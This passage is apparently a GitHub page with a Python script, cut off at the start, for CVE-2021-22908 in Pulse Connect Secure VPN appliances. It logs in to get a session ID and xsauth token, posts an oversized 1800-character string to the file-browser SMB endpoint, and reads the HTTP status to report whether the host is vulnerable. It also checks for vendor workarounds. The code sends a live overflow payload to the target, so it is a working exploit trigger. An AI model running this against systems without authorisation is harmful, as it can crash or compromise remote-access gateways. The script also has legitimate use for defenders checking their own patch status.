cookie.value
 return dsid
def get\_xsauth(host, dsid): xsauth = None url = 'https://%s/dana/home/index.cgi' % host cookies = {'DSID':dsid} res = requests.get(url, verify=False, cookies=cookies, timeout=10) if 'xsauth' in str(res.content): parser = formvaluefinder('xsauth') parser.feed(str(res.content)) xsauth = parser.data else: print('Cannot find xsauth string for provided DSID: %s' % dsid) return xsauth
def trigger\_vul(host, dsid, xsauth): url = 'https://%s/dana/fb/smb/wnf.cgi' % host values = { 't': 's', 'v': '%s,,' % ('A' \* 1800), 'dir': 'tmp', 'si': None, 'ri': None, 'pi': None, 'confirm': 'yes', 'folder': 'tmp', 'acttype': 'create', 'xsauth': xsauth, 'create': 'Create Folder', } cookies = {'DSID': dsid} try: res = requests.post(url, data=values, verify=False, allow\_redirects=False, cookies=cookies, timeout=60) status = res.status\_code if 'DSIDFormDataStr' in str(res.content): # We got page asking to confirm our action print('xsauth value was not accepted') else: if status == 200 and 'Error FB-8' in str(res.content): print('HTTP %s. Windows File Access Policies prevents exploitation.' % status) elif status == 200: print('HTTP %s. Not vulnerable.' % status) elif status == 403: print('HTTP %s. XML workaround applied.' % status) elif status == 500: print('HTTP %s. %s is vulnerable to CVE-2021-22908!' % (status, host)) elif status == 302: print('HTTP %s. Are you sure your DSID is valid?' % host) else: print('HTTP %s. Not sure how to interpret this result.' % status) except requests.exceptions.ReadTimeout: print('No response from server. Try again...')
def get\_default(host): url = 'https://%s' % host res = requests.get(url, verify=False, allow\_redirects=False, timeout=10) try: location = res.headers['location'] if 'dana-na' not in location: print('%s does not seem to be a PCS host' % host) location = None except: pass return location
def check\_xml(host): url = 'https://%s/dana/meeting' % host #print('Checking status of %s ...' % url) res = requests.get(url, verify=False, allow\_redirects=False, timeout=10) if res.status\_code == 403: print('Workaround-2104 appears to be installed') else: print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')
 url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host #print('Checking status of %s ...' % url) res = requests.get(url, verify=False, allow\_redirects=False, timeout=10) if res.status\_code == 403: print('Workaround-2105 appears to be installed') else: print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')
host = args.hostif args.noauth: check\_xml(host)else: defaulturi = get\_default(host) if defaulturi:
 if not args.realm: realm = get\_realm(host, defaulturi) else: realm = args.realm
 if realm: print('Realm: %s' % realm) if not args.user and not args.dsid: user = input('User: ') else: user = args.user if not args.password and not args.dsid: password = getpass.getpass() else: password = args.password if not args.dsid: dsid = get\_dsid(host, defaulturi, realm, user, password) print('DSID: %s' % dsid) else: dsid = args.dsid if dsid: if not args.xsauth: xsauth = get\_xsauth(host, dsid) print('xsauth: %s' % xsauth) else: xsauth = args.xsauth if xsauth: trigger\_vul(host, dsid, xsauth)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


